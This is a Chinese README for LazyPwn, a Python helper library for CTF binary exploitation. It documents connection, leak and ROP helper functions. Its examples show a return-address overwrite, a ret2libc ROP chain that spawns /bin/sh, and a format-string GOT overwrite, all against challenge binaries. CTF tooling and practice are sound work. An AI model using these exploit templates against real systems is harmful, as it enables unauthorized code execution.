LazyPwn - 简化Pwn攻击的Python库

LazyPwn 是一个专为CTF竞赛和二进制漏洞利用设计的Python库，旨在简化pwn脚本编写过程，提供统一且便捷的API接口。
特性

    🚀 简化的连接管理

    📦 统一的发送/接收函数

    🔍 常用的泄露和转换工具

    🐛 集成调试支持

    🎯 快速符号地址获取

    🔧 ROP相关功能

    🤖 自动化利用模板

安装
方法一：使用pip安装
bash

git clone <repository-url>
cd lazypwn
pip install -e .

方法二：直接使用文件
bash

# 将 lazypwn.py 放在你的项目目录中
cp lazypwn.py /path/to/your/project/

快速开始
python

from lazypwn import PwnHelper

# 初始化
ph = PwnHelper(
    binary_path="./chall",
    libc_path="/path/to/libc.so.6",
    remote_host="127.0.0.1", 
    remote_port=1337
)

# 连接（自动判断远程/本地）
ph.connect()

# 发送数据
ph.sla(b"input:", b"1")
ph.sl(b"%p" * 10)

# 泄露地址
leak_addr = ph.l64()
ph.leak("main", leak_addr)

# 获取shell
ph.interactive()

API 参考
PwnHelper 类
初始化
python

ph = PwnHelper(
    binary_path,           # 二进制文件路径 (必需)
    libc_path=None,        # libc路径 (可选)
    remote_host=None,      # 远程主机地址 (可选)
    remote_port=None,      # 远程端口 (可选)
    arch="amd64",          # 架构，默认amd64
    log_level="debug"      # 日志级别，默认debug
)

连接管理
方法	描述	示例
connect(use_remote=None)	建立连接	ph.connect()
interactive()	进入交互模式	ph.interactive()
itr()	interactive的别名	ph.itr()
发送函数
方法	描述	示例
s(data)	发送原始数据	ph.s(b"AAAA")
sa(delim, data)	在收到delim后发送数据	ph.sa(b">", b"1")
sl(data)	发送一行数据	ph.sl(b"hello")
sla(delim, data)	在收到delim后发送一行数据	ph.sla(b"name:", b"admin")
接收函数
方法	描述	示例
r(num)	接收指定字节数	data = ph.r(4)
ru(delims, drop=False)	接收到delims为止	data = ph.ru(b"end")
rl()	接收一行	line = ph.rl()
地址泄露工具
方法	描述	示例
uu32(data)	将数据转换为32位整数	addr = ph.uu32(data)
uu64(data)	将数据转换为64位整数	addr = ph.uu64(data)
l32()	泄露32位地址(常见格式)	addr = ph.l32()
l64()	泄露64位地址(常见格式)	addr = ph.l64()
l32_suffix(suffix)	自定义后缀泄露32位地址	addr = ph.l32_suffix(b"\xf7")
l64_suffix(suffix)	自定义后缀泄露64位地址	addr = ph.l64_suffix(b"\x7f")
leak(name, addr)	打印泄露的地址	ph.leak("main", 0x400000)
调试功能
方法	描述	示例
debug(script=None)	附加gdb调试器	ph.debug()
bug(script=None)	debug的别名	ph.bug()
符号地址获取
方法	描述	示例
sym(symbol_name)	获取符号地址	main = ph.sym("main")
got(symbol_name)	获取GOT地址	printf_got = ph.got("printf")
plt(symbol_name)	获取PLT地址	printf_plt = ph.plt("printf")
ROP和偏移计算
方法	描述	示例
find_gadget(gadget)	查找ROP gadget	gadget = ph.find_gadget(["pop rdi", "ret"])
libc_base_leak(addr, symbol)	通过泄露计算libc基址	libc_base = ph.libc_base_leak(leak, "printf")
elf_base_leak(addr, symbol)	通过泄露计算ELF基址	elf_base = ph.elf_base_leak(leak, "main")
便捷函数
快速连接
python

from lazypwn import connect_binary

# 快速连接到二进制文件
io = connect_binary("./chall", "127.0.0.1", 1337)

快速调试
python

from lazypwn import quick_debug

# 快速附加调试器
quick_debug(io)

Payload生成
python

from lazypwn import p64_payload, p32_payload

# 生成64位打包payload
payload = p64_payload(0x400000, 0x401000, 0x402000)

# 生成32位打包payload  
payload = p32_payload(0x8048000, 0x8049000)

自动化利用
python

from lazypwn import auto_exploit

def leak_func(helper):
    helper.sla(b">", b"1")
    return helper.l64()

# 自动化利用模板
auto_exploit(ph, payload, leak_func=leak_func)

使用示例
基础利用
python

from lazypwn import PwnHelper

ph = PwnHelper("./chall")
ph.connect()

# 缓冲区溢出
payload = b"A" * 64
payload += p64(ph.sym("win"))

ph.sl(payload)
ph.interactive()

带libc的利用
python

from lazypwn import PwnHelper

ph = PwnHelper(
    "./chall", 
    libc_path="./libc.so.6",
    remote_host="ctf.example.com",
    remote_port=1337
)
ph.connect()

# 泄露libc地址
ph.sla(b">", b"1")
leak_addr = ph.l64()
libc_base = ph.libc_base_leak(leak_addr, "printf")
ph.leak("libc_base", libc_base)

# 计算system地址
system = libc_base + ph.libc.sym["system"]
binsh = libc_base + next(ph.libc.search(b"/bin/sh"))

# ROP链
payload = b"A" * 64
payload += p64(ph.find_gadget(["pop rdi", "ret"])[0])
payload += p64(binsh)
payload += p64(system)

ph.sl(payload)
ph.interactive()

格式化字符串漏洞
python

from lazypwn import PwnHelper

ph = PwnHelper("./fmt_chall")
ph.connect()

# 泄露栈地址
ph.sl(b"%p.%p.%p.%p.%p")
data = ph.ru(b"\n")
print(f"Stack leaks: {data}")

# 改写GOT表
payload = fmtstr_payload(6, {ph.got("printf"): ph.plt("system")})
ph.sl(payload)
ph.sl(b"/bin/sh")
ph.interactive()

常见问题
Q: 如何判断是否远程连接？

A: 使用 ph.is_remote 属性：
python

if ph.is_remote:
    print("远程连接")
else:
    print("本地进程")

Q: 如何设置自定义gdb脚本？

A: 在debug方法中传入gdb脚本：
python

gdb_script = """
b *main
b *main+10
c
"""
ph.debug(gdb_script)

Q: 如何处理不同的架构？

A: 在初始化时指定arch参数：
python

# 32位程序
ph = PwnHelper("./chall32", arch="i386")

# ARM程序  
ph = PwnHelper("./chall_arm", arch="arm")

贡献

欢迎提交Issue和Pull Request来改进LazyPwn！
